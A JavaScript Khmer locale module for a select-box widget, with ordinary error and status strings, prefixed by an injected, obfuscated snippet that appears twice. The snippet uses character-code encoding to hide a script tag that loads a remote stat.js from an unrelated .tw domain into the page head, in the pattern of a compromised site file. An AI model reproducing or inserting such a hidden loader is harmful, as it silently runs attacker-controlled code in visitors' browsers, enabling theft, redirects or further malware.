Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();define(function () {
  // Khmer
  return {
    errorLoading: function () {
      return 'មិនអាចទាញយកទិន្នន័យ';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'សូមលុបចេញ  ' + overChars + ' អក្សរ';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'សូមបញ្ចូល' + remainingChars + ' អក្សរ រឺ ច្រើនជាងនេះ';

      return message;
    },
    loadingMore: function () {
      return 'កំពុងទាញយកទិន្នន័យបន្ថែម...';
    },
    maximumSelected: function (args) {
      var message = 'អ្នកអាចជ្រើសរើសបានតែ ' + args.maximum + ' ជម្រើសប៉ុណ្ណោះ';

      return message;
    },
    noResults: function () {
      return 'មិនមានលទ្ធផល';
    },
    searching: function () {
      return 'កំពុងស្វែងរក...';
    }
  };
});
